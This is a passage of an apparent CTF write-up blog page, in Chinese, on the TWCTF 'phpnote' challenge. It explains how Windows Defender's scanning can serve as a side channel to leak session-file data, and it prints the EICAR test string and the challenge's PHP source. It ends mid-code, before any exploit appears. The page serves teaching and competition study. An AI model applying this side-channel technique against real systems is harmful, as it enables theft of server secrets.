@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>从一道CTF题了解Windows-Defender侧信道攻击 | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="ctf,侧信道攻击">
+    <meta name="description" content="前言前几天打了一下由tokyowesterns举办的TWCTF，感觉phpnote这题还是不错的，一个全新的知识点，比赛的时候没有解出来，赛后问了一下梅子酒才知道这个是用windows-defender测信道攻击，下面记录一下解题过程 前置知识Windows Defender介绍 来自WIKI  Windows Defender（Windows 10创意者更新后名为Windows Defender">
+<meta name="keywords" content="ctf,侧信道攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道CTF题了解Windows-Defender侧信道攻击">
+<meta property="og:url" content="https://byqiyou.github.io/2019/09/08/从一道CTF题了解Windows-Defender侧信道攻击/index.html">
+<meta property="og:site_name" content="七友">
+<meta property="og:description" content="前言前几天打了一下由tokyowesterns举办的TWCTF，感觉phpnote这题还是不错的，一个全新的知识点，比赛的时候没有解出来，赛后问了一下梅子酒才知道这个是用windows-defender测信道攻击，下面记录一下解题过程 前置知识Windows Defender介绍 来自WIKI  Windows Defender（Windows 10创意者更新后名为Windows Defender">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190909232234-a61c12ca-d315-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190908221400-e78b2e22-d242-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190908214839-5cd883ea-d23f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190909233328-2be928d8-d317-1.png">
+<meta property="og:updated_time" content="2019-09-13T03:36:27.160Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从一道CTF题了解Windows-Defender侧信道攻击">
+<meta name="twitter:description" content="前言前几天打了一下由tokyowesterns举办的TWCTF，感觉phpnote这题还是不错的，一个全新的知识点，比赛的时候没有解出来，赛后问了一下梅子酒才知道这个是用windows-defender测信道攻击，下面记录一下解题过程 前置知识Windows Defender介绍 来自WIKI  Windows Defender（Windows 10创意者更新后名为Windows Defender">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190909232234-a61c12ca-d315-1.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">七友</h5>
+          <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/byqiyou" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/friends"  >
+                <i class="icon icon-lg icon-friends"></i>
+                Friends
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-about"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">从一道CTF题了解Windows-Defender侧信道攻击</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">从一道CTF题了解Windows-Defender侧信道攻击</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-09-08T13:45:21.000Z" itemprop="datePublished" class="page-time">
+  2019-09-08
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前置知识"><span class="post-toc-number">2.</span> <span class="post-toc-text">前置知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Windows-Defender介绍"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Windows Defender介绍</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#关于-mpengine-dll"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">关于 mpengine.dll</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Windows-Defender触发机制"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">Windows-Defender触发机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#phpnote"><span class="post-toc-number">3.</span> <span class="post-toc-text">phpnote</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Reference"><span class="post-toc-number"></span> <span class="post-toc-text">Reference</span></a>
+        </nav>
+    </aside>
+
+
+<article id="post-从一道CTF题了解Windows-Defender侧信道攻击"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">从一道CTF题了解Windows-Defender侧信道攻击</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-09-08 21:45:21" datetime="2019-09-08T13:45:21.000Z"  itemprop="datePublished">2019-09-08</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天打了一下由<code>tokyowesterns</code>举办的TWCTF，感觉phpnote这题还是不错的，一个全新的知识点，比赛的时候没有解出来，赛后问了一下梅子酒才知道这个是用<code>windows-defender</code>测信道攻击，下面记录一下解题过程</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Windows-Defender介绍"><a href="#Windows-Defender介绍" class="headerlink" title="Windows Defender介绍"></a>Windows Defender介绍</h3><blockquote>
+<p>来自WIKI</p>
+</blockquote>
+<p><code>Windows Defender</code>（Windows 10创意者更新后名为<code>Windows Defender Antivirus</code>），曾用名<code>Microsoft AntiSpyware</code>，最初是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在<code>Windows Vista</code>以及以后的版本中。<code>Windows Defender</code>的定义库更新很频繁。在Windows 8及之后的系统中取代<code>Microsoft Security Essentials</code>，成为一款全面反病毒软件。</p>
+<h3 id="关于-mpengine-dll"><a href="#关于-mpengine-dll" class="headerlink" title="关于 mpengine.dll"></a>关于 mpengine.dll</h3><p><code>TokyoWesterns</code>在PPT上是这么描述的<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909232234-a61c12ca-d315-1.png" alt="image.png"></p>
+<p><code>mpengine.dll</code>是<code>Windows Defender</code>核心的ddl文件，其中它包含了JS引擎，它继承了JS的一些基础语法，其中它支持eval函数，但是它会对eval函数的参数进行检测，如果发现恶意数据则会进行拦截</p>
+<h3 id="Windows-Defender触发机制"><a href="#Windows-Defender触发机制" class="headerlink" title="Windows-Defender触发机制"></a>Windows-Defender触发机制</h3><p>在WCTF2019上<code>TokyoWesterns</code>出了一个关于<code>Windows Defender</code>侧信道攻击的题目，赛后分享的PPT地址为：<a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener">链接</a></p>
+<p>Defender对文件的检测行为如下（摘自TokyoWesterns的PPT）：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908221400-e78b2e22-d242-1.png" alt="image.png"></p>
+<p>所以我们第一步是要找到能触发<code>Windows Defender</code>检测机制的文件，<code>EICAR</code>测试文件可以做到这一点，关于EICAR测试文件的解释如下（<a href="http://docs.trendmicro.com/all/ent/de/v1.5/zh-cn/de_1.5_olh/ctm_ag/ctm1_ag_ch8/t_test_eicar_file.htm" target="_blank" rel="noopener">参考链接</a>）：</p>
+<pre><code>欧洲计算机防病毒研究所 (EICAR) 开发了一种测试病毒，可用于测试您的防病毒设备。此脚本是一个惰性文本文件。二进制特征码包含在多数防病毒产品供应商的病毒码文件中。它本质上不是病毒，并且不包含任何程序代码。
+</code></pre><p>我们可以从上面的参考链接中下载到这样的一个EICAR测试文件</p>
+<pre><code>X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+</code></pre><p>然后我们在本地测试一下看看会不会拦截<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908214839-5cd883ea-d23f-1.png" alt="image.png"></p>
+<p>可以明显看到被拦截了，但是如果把这个字符破坏掉就不会被拦截，所以我们可以利用<code>Windows Defender</code>这一点来进行侧信道攻击</p>
+<h2 id="phpnote"><a href="#phpnote" class="headerlink" title="phpnote"></a>phpnote</h2><p>从注释中得到</p>
+<pre><code>http://phpnote.chal.ctf.westerns.tokyo/?action=source
+</code></pre><p>源码</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Note</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$admin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">notes</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isadmin</span> <span class="token operator">=</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">addnote</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">notes</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$body</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getnotes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">notes</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isadmin</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$hmac</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$hmac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">hmac</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">gen_secret</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token constant">SALT</span> <span class="token punctuation">.</span> <span class="token variable">$seed</span> <span class="token punctuation">.</span> <span class="token constant">PEPPER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">is_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /?action=$action"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token string">'logout'</span><span class="token punctuation">,</span> <span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'source'</span><span class="token punctuation">,</span> <span class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string">'source'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$realname</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'realname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$note</span> <span class="token operator">=</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'note'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token operator">?</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'note'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Note</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string">'login'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$realname</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$realname</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'invalid name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'realname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$realname</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">gen_secret</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string">'logout'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string">'post'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$body</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$note</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addnote</span><span class="token punctuation">(</span><span class="token variable">$title</span><span class="token punctuation">,</span> <span class="token variable">$body</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$note</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'note'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'hmac'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">hmac</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string">'getflag'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$note</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//.....省略部分源码....</span>
+</code></pre>
+<p>关键代码如下</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$hmac</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$hmac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">//....省略.....</span>
+    <span class="token variable">$note</span> <span class="token operator">=</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'note'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token operator">?</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'note'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Note</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>从上面代码可以看出cookie里面数据是经过签名校验的，但是我们<code>secret</code>不知道，所以直接伪造cookie这条路走不通了，由于php的<code>session</code>是以文件的形式保存的，也就是说我们可以把我们的恶意数据注入到<code>session</code>的文件中，从而触发<code>Windows Defender</code>的检测机制，但是我们怎么控制<code>session</code>文件内容呢，我们先看一下<code>session</code>文件保存的内容</p>
+<p>我们用下面代码测试一下</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">SALT</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">PEPPER</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">gen_secret</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
